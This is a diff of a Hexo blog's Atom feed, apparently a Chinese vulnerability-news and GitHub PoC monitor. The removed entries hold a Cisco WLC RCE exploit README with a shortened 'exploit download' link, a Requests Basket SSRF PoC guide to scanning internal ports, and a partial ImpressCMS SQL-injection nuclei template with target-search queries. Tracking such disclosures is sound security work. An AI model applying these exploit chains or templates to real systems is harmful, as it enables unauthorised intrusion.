@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-03T23:45:12.295Z</updated>
+  <updated>2025-06-04T01:02:27.006Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,78 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>2025 年 6 月安卓安全更新修复 30 多个漏洞</title>
+    <link href="http://example.com/2025/06/04/weixin_3639498523/"/>
+    <id>http://example.com/2025/06/04/weixin_3639498523/</id>
+    <published>2025-06-04T01:02:27.013Z</published>
+    <updated>2025-06-04T01:02:27.006Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/hE-AjDw2mjM2NZaSnMkr5A">https://mp.weixin.qq.com/s/hE-AjDw2mjM2NZaSnMkr5A</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/hE-AjDw2mjM2NZaSnMkr5A&quot;&gt;https://mp.weixin.qq.com/s/hE-AjDw2mjM2NZaSnMkr5A&lt;/a&gt;&lt;/p</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>有 10 年历史的 Roundcube RCE 漏洞可让攻击者执行恶意代码</title>
+    <link href="http://example.com/2025/06/04/weixin_256568211/"/>
+    <id>http://example.com/2025/06/04/weixin_256568211/</id>
+    <published>2025-06-04T01:02:26.692Z</published>
+    <updated>2025-06-04T01:02:26.686Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/UYLkUW1GysaIXM_CjHLMyw">https://mp.weixin.qq.com/s/UYLkUW1GysaIXM_CjHLMyw</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/UYLkUW1GysaIXM_CjHLMyw&quot;&gt;https://mp.weixin.qq.com/s/UYLkUW1GysaIXM_CjHLMyw&lt;/a&gt;&lt;/p</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>卡巴斯基称亲乌克兰黑客组织“黑猫头鹰”对俄罗斯构成“重大威胁”</title>
+    <link href="http://example.com/2025/06/04/weixin_2723745326/"/>
+    <id>http://example.com/2025/06/04/weixin_2723745326/</id>
+    <published>2025-06-04T01:02:26.018Z</published>
+    <updated>2025-06-04T01:02:26.014Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/ftGk-G0PoxkMcNaLTr4O8A">https://mp.weixin.qq.com/s/ftGk-G0PoxkMcNaLTr4O8A</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/ftGk-G0PoxkMcNaLTr4O8A&quot;&gt;https://mp.weixin.qq.com/s/ftGk-G0PoxkMcNaLTr4O8A&lt;/a&gt;&lt;/p</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+  </entry>
   
   <entry>
     <title>Apache Kyuubi 配置信息泄露漏洞</title>
@@ -529,101 +601,6 @@
     <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
     
     <category term="CVE-2018-12455" scheme="http://example.com/tags/CVE-2018-12455/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Cisco IOS XE WLC 硬编码JWT未授权远程代码执行漏洞</title>
-    <link href="http://example.com/2025/06/03/github_518088240/"/>
-    <id>http://example.com/2025/06/03/github_518088240/</id>
-    <published>2025-06-03T13:46:07.285Z</published>
-    <updated>2025-06-03T13:46:07.283Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Cisco IOS XE WLC 硬编码JWT未授权远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-20188</li></ul><p><strong>漏洞类型：</strong> 硬编码凭证</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Cisco IOS XE Software for Wireless LAN Controllers (WLCs) 中存在一个严重的未授权远程代码执行漏洞，该漏洞源于Out-of-Band AP Image Download功能中使用了硬编码的JSON Web Token (JWT)。攻击者可以利用这个硬编码的JWT通过HTTPS POST请求向AP Image Download端点上传任意文件或webshell，并通过路径遍历触发上传的负载执行，从而在WLC上以root权限执行任意命令。需要注意的是，此功能默认禁用，仅当显式启用Out-of-Band Image Download的WLC才会受到此漏洞的影响。</p><p><strong>产品厂商：</strong> Cisco</p><p><strong>产品名称：</strong> IOS XE WLC (Out-of-Band AP Image Download)</p><p><strong>影响版本：</strong> All builds with Out-of-Band AP Image Download enabled prior to fix release 17.12.1a</p><p><strong>来源：</strong> <a href="https://github.com/takeshirisulu/CVE-2025-20188">https://github.com/takeshirisulu/CVE-2025-20188</a></p><p><strong>类型：</strong> CVE-2025:github search</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><br><span class="hljs-comment"># CVE-2025-20188: Unauthenticated RCE in Cisco IOS XE WLC via Hard-Coded JWT</span><br><br><span class="hljs-comment">## Overview</span><br><span class="hljs-string">A</span> <span class="hljs-string">critical</span> <span class="hljs-string">**10.0**</span> <span class="hljs-string">CVSSv3</span> <span class="hljs-string">vulnerability</span> <span class="hljs-string">in</span> <span class="hljs-string">Cisco</span> <span class="hljs-string">IOS</span> <span class="hljs-string">XE</span> <span class="hljs-string">Software</span> <span class="hljs-string">for</span> <span class="hljs-string">Wireless</span> <span class="hljs-string">LAN</span> <span class="hljs-string">Controllers</span> <span class="hljs-string">(WLCs)</span> <span class="hljs-string">allows</span> <span class="hljs-string">**unauthenticated**</span> <span class="hljs-string">remote</span> <span class="hljs-string">code</span> <span class="hljs-string">execution</span> <span class="hljs-string">via</span> <span class="hljs-string">the</span> <span class="hljs-string">Out-of-Band</span> <span class="hljs-string">AP</span> <span class="hljs-string">Image</span> <span class="hljs-string">Download</span> <span class="hljs-string">feature.</span> <span class="hljs-string">A</span> <span class="hljs-string">hard-coded</span> <span class="hljs-string">JSON</span> <span class="hljs-string">Web</span> <span class="hljs-string">Token</span> <span class="hljs-string">(JWT)</span> <span class="hljs-string">can</span> <span class="hljs-string">be</span> <span class="hljs-string">abused</span> <span class="hljs-string">to</span> <span class="hljs-string">upload</span> <span class="hljs-string">arbitrary</span> <span class="hljs-string">files</span> <span class="hljs-string">and</span> <span class="hljs-string">execute</span> <span class="hljs-string">commands</span> <span class="hljs-string">as</span> <span class="hljs-string">root—if</span> <span class="hljs-string">this</span> <span class="hljs-string">optional</span> <span class="hljs-string">feature</span> <span class="hljs-string">is</span> <span class="hljs-string">enabled.</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-comment">## Details</span><br><br><span class="hljs-string">|</span> <span class="hljs-string">**CVE</span> <span class="hljs-string">ID**</span>        <span class="hljs-string">|</span> <span class="hljs-string">\`CVE-2025-20188\`</span>                                                    <span class="hljs-string">|</span><br><span class="hljs-string">|-------------------|----------------------------------------------------------------------|</span><br><span class="hljs-string">|</span> <span class="hljs-string">**Published**</span>     <span class="hljs-string">|</span> <span class="hljs-number">2025-05-07</span>                                                           <span class="hljs-string">|</span><br><span class="hljs-string">|</span> <span class="hljs-string">**CVSSv3**</span>        <span class="hljs-string">|</span> <span class="hljs-string">\`10.0\`</span>                          <span class="hljs-string">|</span><br><span class="hljs-string">|</span> <span class="hljs-string">**Vendor**</span>        <span class="hljs-string">|</span> <span class="hljs-string">Cisco</span>                                                                <span class="hljs-string">|</span><br><span class="hljs-string">|</span> <span class="hljs-string">**Product**</span>       <span class="hljs-string">|</span> <span class="hljs-string">IOS</span> <span class="hljs-string">XE</span> <span class="hljs-string">WLC</span> <span class="hljs-string">(Out-of-Band</span> <span class="hljs-string">AP</span> <span class="hljs-string">Image</span> <span class="hljs-string">Download)</span>                           <span class="hljs-string">|</span><br><span class="hljs-string">|</span> <span class="hljs-string">**Authentication**|</span> <span class="hljs-string">None</span> <span class="hljs-string">(hard-coded</span> <span class="hljs-string">JWT)</span>                                                <span class="hljs-string">|</span><br><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-comment">## Vulnerability Summary</span><br><span class="hljs-string">The</span> <span class="hljs-string">Out-of-Band</span> <span class="hljs-string">AP</span> <span class="hljs-string">Image</span> <span class="hljs-string">Download</span> <span class="hljs-string">feature</span> <span class="hljs-string">includes</span> <span class="hljs-string">a</span> <span class="hljs-string">**hard-coded</span> <span class="hljs-string">JWT**</span> <span class="hljs-string">that</span> <span class="hljs-string">the</span> <span class="hljs-string">controller</span> <span class="hljs-string">uses</span> <span class="hljs-string">to</span> <span class="hljs-string">authenticate</span> <span class="hljs-string">firmware-upload</span> <span class="hljs-string">requests.</span> <span class="hljs-string">Because</span> <span class="hljs-string">the</span> <span class="hljs-string">token</span> <span class="hljs-string">is</span> <span class="hljs-string">baked</span> <span class="hljs-string">into</span> <span class="hljs-string">the</span> <span class="hljs-string">software</span> <span class="hljs-string">and</span> <span class="hljs-string">not</span> <span class="hljs-string">user-configurable,</span> <span class="hljs-attr">an attacker can:</span><br><br><span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">Send</span> <span class="hljs-string">an</span> <span class="hljs-string">HTTPS</span> <span class="hljs-string">POST</span> <span class="hljs-string">to</span> <span class="hljs-string">the</span> <span class="hljs-string">AP</span> <span class="hljs-string">Image</span> <span class="hljs-string">Download</span> <span class="hljs-string">endpoint</span> <span class="hljs-string">with</span> <span class="hljs-string">the</span> <span class="hljs-string">hard-coded</span> <span class="hljs-string">JWT.</span>  <br><span class="hljs-number">2</span><span class="hljs-string">.</span> <span class="hljs-string">Upload</span> <span class="hljs-string">arbitrary</span> <span class="hljs-string">files</span> <span class="hljs-string">or</span> <span class="hljs-string">webshells</span> <span class="hljs-string">via</span> <span class="hljs-string">path</span> <span class="hljs-string">traversal.</span>  <br><span class="hljs-number">3</span><span class="hljs-string">.</span> <span class="hljs-string">Trigger</span> <span class="hljs-string">execution</span> <span class="hljs-string">of</span> <span class="hljs-string">uploaded</span> <span class="hljs-string">payloads</span> <span class="hljs-string">with</span> <span class="hljs-string">**root**</span> <span class="hljs-string">privileges</span> <span class="hljs-string">on</span> <span class="hljs-string">the</span> <span class="hljs-string">WLC.</span><br><br><span class="hljs-string">&gt;</span> <span class="hljs-string">**Note:**</span> <span class="hljs-string">This</span> <span class="hljs-string">feature</span> <span class="hljs-string">is</span> <span class="hljs-string">**disabled</span> <span class="hljs-string">by</span> <span class="hljs-string">default**.</span> <span class="hljs-string">Only</span> <span class="hljs-string">WLCs</span> <span class="hljs-string">with</span> <span class="hljs-string">Out-of-Band</span> <span class="hljs-string">Image</span> <span class="hljs-string">Download</span> <span class="hljs-string">explicitly</span> <span class="hljs-string">enabled</span> <span class="hljs-string">are</span> <span class="hljs-string">vulnerable.</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-comment">## Affected Versions</span><br><span class="hljs-attr">Cisco IOS XE Software for WLC:</span><br><span class="hljs-string">All</span> <span class="hljs-string">builds</span> <span class="hljs-string">with</span> <span class="hljs-string">Out-of-Band</span> <span class="hljs-string">AP</span> <span class="hljs-string">Image</span> <span class="hljs-string">Download</span> <span class="hljs-string">enabled</span> <span class="hljs-string">prior</span> <span class="hljs-string">to</span> <span class="hljs-string">fix</span> <span class="hljs-string">release</span> <span class="hljs-number">17.12</span><span class="hljs-string">.1a</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-comment">## Exploit: [Download](https://tinyurl.com/27ptr8ye)</span><br><br><span class="hljs-comment">## Usage</span><br><br><span class="hljs-string">\`\`\`bash</span><br><span class="hljs-string">python3</span> <span class="hljs-string">CVE-2025-20188.py</span> <span class="hljs-string">--config</span> <span class="hljs-string">config.json</span><br><span class="hljs-string">\`\`\`</span><br><br><span class="hljs-comment">## Mitigation &amp; Patch</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">Disable</span> <span class="hljs-string">Out-of-Band</span> <span class="hljs-string">AP</span> <span class="hljs-string">Image</span> <span class="hljs-string">Download</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">Upgrade</span> <span class="hljs-string">WLC</span> <span class="hljs-string">to</span> <span class="hljs-string">IOS</span> <span class="hljs-string">XE</span> <span class="hljs-number">17.12</span><span class="hljs-string">.1a</span> <span class="hljs-string">or</span> <span class="hljs-string">later,</span> <span class="hljs-string">which</span> <span class="hljs-string">removes</span> <span class="hljs-string">the</span> <span class="hljs-string">hard-coded</span> <span class="hljs-string">JWT.</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">Monitor</span> <span class="hljs-string">WLC</span> <span class="hljs-string">logs</span> <span class="hljs-string">for</span> <span class="hljs-string">unexpected</span> <span class="hljs-string">/api/v1/oob-upload</span> <span class="hljs-string">or</span> <span class="hljs-string">path-traversal</span> <span class="hljs-string">patterns.</span><br><br><span class="hljs-string">**Contact:**</span>  <br><span class="hljs-string">sratet@proton.me</span><br><br><br></code></pre></td></tr></table></figure><pre><code class="hljs">- README.md```</code></pre>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Cisco IOS XE WLC 硬编码JWT未授权远程代码执行漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-2025-20188</summary>
-      
-    
-    
-    
-    <category term="Github Poc 监控" scheme="http://example.com/categories/Github-Poc-%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
-    
-    <category term="CVE-2025-20188" scheme="http://example.com/tags/CVE-2025-20188/"/>
-    
-    <category term="硬编码凭证" scheme="http://example.com/tags/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%87%AD%E8%AF%81/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Requests Basket Server-Side Request Forgery Vulnerability</title>
-    <link href="http://example.com/2025/06/03/github_1842866407/"/>
-    <id>http://example.com/2025/06/03/github_1842866407/</id>
-    <published>2025-06-03T13:45:44.080Z</published>
-    <updated>2025-06-03T13:45:44.078Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Requests Basket Server-Side Request Forgery Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-27163</li></ul><p><strong>漏洞类型：</strong> 服务器端请求伪造</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Requests Basket v1.2.1及之前版本存在服务器端请求伪造(SSRF)漏洞，编号为CVE-2023-27163。攻击者可以利用此漏洞通过构造恶意请求，扫描服务器内部端口，访问内部服务。</p><p><strong>产品名称：</strong> Requests Basket</p><p><strong>影响版本：</strong> &lt;&#x3D; 1.2.1</p><p><strong>来源：</strong> <a href="https://github.com/J0ey17/Exploit_CVE-2023-27163">https://github.com/J0ey17/Exploit_CVE-2023-27163</a></p><p><strong>类型：</strong> CVE-2023:github search</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br># CVE-<span class="hljs-number">2023</span>-<span class="hljs-number">27163</span> PoC Exploit Code<br><br>This Python script is a Proof of Concept (PoC) for **CVE-<span class="hljs-number">2023</span>-<span class="hljs-number">27163</span>**, a Server-Side Request Forgery (SSRF) vulnerability in Request Basket.<br><br>### Code Description<br><br><span class="hljs-title">The script automates the exploitation of CVE-2023-27163. It performs the following actions:</span><br><br><span class="hljs-number">1</span>.  **Generates a random basket name**: Creates a unique endpoint for interaction.<br><span class="hljs-number">2</span>.  **Creates a basket <span class="hljs-literal">and</span> retrieves an API token**: Interacts with the Request Basket API to set up a <span class="hljs-keyword">new</span> basket <span class="hljs-literal">and</span> get the authorization token.<br><span class="hljs-number">3</span>.  **Configures the basket for SSRF**: Modifies the basket&#x27;s configuration to forward incoming requests to an internal address (\`127.<span class="hljs-number">0.0</span>.<span class="hljs-number">1</span>\`) on a specified port.<br><span class="hljs-number">4</span>.  **Attempts to access internal ports**: It iterates through a predefined range of ports (<span class="hljs-number">75</span>-<span class="hljs-number">81</span> by default), attempting to access services running on \`localhost\` of the vulnerable server via the configured basket.<br><span class="hljs-number">5</span>.  **Displays results**: If a service is found <span class="hljs-literal">and</span> returns a <span class="hljs-number">200</span> OK status, it prints a message indicating the open port <span class="hljs-literal">and</span> the beginning of the response content.<br><br>This effectively allows an attacker to scan internal ports on the server hosting the vulnerable Request Basket instance.<br><br>### Configuration for Usage<br><br><span class="hljs-title">To adapt this script for your own use, you may need to modify the following:</span><br><br><span class="hljs-number">1</span>.  **\`IP_Vuln_Server\`**:<br><span class="hljs-title">    * Change the IP address and port \`r&#x27;10.129.229.26:</span><span class="hljs-number">55555</span>&#x27;\` to match the target vulnerable Request Basket server.<br>    \`\`\`python<br><span class="hljs-title">    IP_Vuln_Server = r&#x27;YOUR_TARGET_IP:</span>PORT&#x27;<br>    \`\`\`<br><br><span class="hljs-number">2</span>.  **Port Range for Scanning** (Optional):<br>    * The script currently scans ports <span class="hljs-number">75</span> through <span class="hljs-number">81</span> (\`range(<span class="hljs-number">75</span>,<span class="hljs-number">82</span>)\`).<br>    * Adjust this range in the \`main()\` function if you want to scan different <span class="hljs-literal">or</span> a wider set of internal ports.<br>    \`\`\`python<br><span class="hljs-title">    for i in range(START_PORT, END_PORT + 1):</span> # e.g., range(<span class="hljs-number">1</span>, <span class="hljs-number">65536</span>) for all ports<br>        ConfBasketAndFetchResp(headers, i)<br>    \`\`\`<br><br><span class="hljs-number">3</span>.  **\`forward_url\` in \`ConfBasketAndFetchResp\`** (Advanced/Specific Use Cases):<br><span class="hljs-title">    * By default, it targets \`http://127.0.0.1:</span>&#123;port&#125;/\`.<br>    * If you suspect other internal services on different paths <span class="hljs-literal">or</span> even other internal IP addresses reachable by the vulnerable server, you can modify the \`forward_url\` string. However, for the intended SSRF to scan \`localhost\`, \`127.<span class="hljs-number">0.0</span>.<span class="hljs-number">1</span>\` is usually correct.<br>    \`\`\`python<br>    json_config = &#123;<br>        <span class="hljs-string">&quot;forward_url&quot;</span>: f<span class="hljs-string">&quot;http://TARGET_INTERNAL_IP:&#123;port&#125;/TARGET_PATH&quot;</span>,<br>        # ... other parameters<br>    &#125;<br>    \`\`\`<br><br>Ensure you have the \`requests\` library installed (\`pip install requests\`). Use this PoC responsibly <span class="hljs-literal">and</span> only on systems you have explicit permission to test.<br><br><br></code></pre></td></tr></table></figure><pre><code class="hljs">- LICENSE- PoC_27163.py- README.md```</code></pre>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Requests Basket Server-Side Request Forgery Vulnerability&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;CVE：&lt;</summary>
-      
-    
-    
-    
-    <category term="Github Poc 监控" scheme="http://example.com/categories/Github-Poc-%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="CVE-2023:github search" scheme="http://example.com/tags/CVE-2023-github-search/"/>
-    
-    <category term="CVE-2023-27163" scheme="http://example.com/tags/CVE-2023-27163/"/>
-    
-    <category term="服务器端请求伪造" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ImpressCMS SQL注入漏洞</title>
-    <link href="http://example.com/2025/06/03/github_248943360/"/>
-    <id>http://example.com/2025/06/03/github_248943360/</id>
-    <published>2025-06-03T13:45:30.584Z</published>
-    <updated>2025-06-03T13:45:30.581Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> ImpressCMS SQL注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2021-26599</li></ul><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> ImpressCMS在1.4.3版本之前存在SQL注入漏洞，攻击者可以通过include&#x2F;findusers.php中的groups参数执行任意SQL查询，无需认证即可利用此漏洞。</p><p><strong>产品厂商：</strong> impresscms</p><p><strong>产品名称：</strong> ImpressCMS</p><p><strong>影响版本：</strong> &lt; 1.4.3</p><p><strong>搜索语法：</strong> http.html:”ImpressCMS” OR body&#x3D;”ImpressCMS”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/2a478c85d6b8f1db9111473d82c37e03e4e2a95c/http%2Fcves%2F2021%2FCVE-2021-26599.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/2a478c85d6b8f1db9111473d82c37e03e4e2a95c/http%2Fcves%2F2021%2FCVE-2021-26599.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">26599</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> ImpressCMS <span class="hljs-operator">&lt;</span> <span class="hljs-number">1.4</span>.<span class="hljs-number">3</span> <span class="hljs-operator">-</span> SQL Injection<br>  <span class="hljs-params">author:</span> ritikchaddha<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> |<br>    ImpressCMS before <span class="hljs-number">1.4</span>.<span class="hljs-number">3</span> is vulnerable to SQL injection via the groups parameter <span class="hljs-keyword">in</span> include<span class="hljs-operator">/</span>findusers.php, allowing unauthenticated attackers to execute arbitrary SQL queries.<br>  <span class="hljs-params">remediation:</span> |<br>    Update ImpressCMS to version <span class="hljs-number">1.4</span>.<span class="hljs-number">3</span> <span class="hljs-keyword">or</span> later.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//hackerone.com/reports/1081145</span><br>    <span class="hljs-operator">-</span> http:<span class="hljs-symbol">//karmainsecurity.com/KIS-2022-04</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2021-26599</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">26599</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">89</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">vendor:</span> impresscms<br>    <span class="hljs-params">product:</span> impresscms<br>    <span class="hljs-params">shodan-query:</span> http.html:<span class="hljs-string">&quot;ImpressCMS&quot;</span><br>    <span class="hljs-params">fofa-query:</span> body<span class="hljs-operator">=</span><span class="hljs-string">&quot;ImpressCMS&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2021,impresscms,sqli<br><br><span class="hljs-params">flow:</span> http(<span class="hljs-number">1</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">2</span>)<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-operator">/</span>misc.php<span class="hljs-operator">?</span>action<span class="hljs-operator">=</span>showpopups&amp;type<span class="hljs-operator">=</span>friend HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> token<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;REQUEST&#x27; value=&#x27;(.*)&#x27;&quot;</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        @<span class="hljs-params">timeout:</span> <span class="hljs-number">30</span>s<br>        POST <span class="hljs-symbol">/include/findusers.php</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        